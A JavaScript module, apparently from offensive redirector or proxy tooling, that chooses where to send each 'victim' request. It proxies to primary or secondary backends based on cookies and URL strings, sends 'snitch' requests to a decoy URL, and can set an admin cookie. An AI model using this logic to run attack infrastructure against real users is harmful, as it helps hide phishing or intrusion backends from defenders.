module.exports = {
  getTarget: function(humble_domain, victim_request) {
    try {
      var domain = config[humble_domain]
      var primary = domain.primary_target
      var secondary = domain.secondary_target
      var full_path = victim_request.headers.host + url.parse(victim_request.url).path
      var cookie = victim_request.headers.cookie
      if (full_path.includes(domain.snitch.snitch_string)){
        console.log(success + "Snitch triggered. Redirecting to: " + domain.snitch.redirect_url)
        access_log.write("[+] Snitch triggered. Redirecting to: " + domain.snitch.redirect_url + "\n")
          return {
          target_type: "snitch",
          target: domain.snitch.redirect_url
        }
      } 

      if (admin_config.set_admin.switch){
        if (full_path.includes(admin_config.set_admin.search_string)){
          console.log(success + "Setting admin cookie")
          access_log.write("[+] Setting admin cookie\n")
            return {
            target_type: "set_cookie",
            target: admin_config.admin_cookie.cookie_name + " = " + admin_config.admin_cookie.cookie_value + ";secure;httponly"
          }
        } 
      }

      if (domain.cookie_search) {
	if (domain.cookie_search.switch) {
          try {
            if (cookie.includes(domain.cookie_search.cookie + "=" + domain.cookie_search.cookie_value)) {
              return {
                target_type: "proxy",
                target: secondary 
              }
            }
          } catch (err) {
            console.log(fail + "couldn't read cookie for cookie_search: " + err)
          }
        }
      } 

      if (domain.url_search) {
	if (domain.url_search.switch) {
          try {
            if (full_path.includes(domain.url_search.search_string)) {
              //set our search cookie if we have this option set in our config
              //this come into play in humbleProxy and is used as a global semaphore
              set_cookie = domain.url_search.set_cookie
              return {
                target_type: "proxy",
                target: secondary 
              }
            }
          } catch (err) {
            console.log(fail + "problem with url_search: " + err)
          }
        }
      } 

      return {
        target_type: "proxy",
        target: primary
      }

    } catch(err){
      console.log(fail + "couldn't select target: " + err)
      access_log.write("[-] couldn't select target: " + err + "\n")
      return {
        target_type: "snitch",
        target: "https://www.example.com"
      }
    }
  }
}
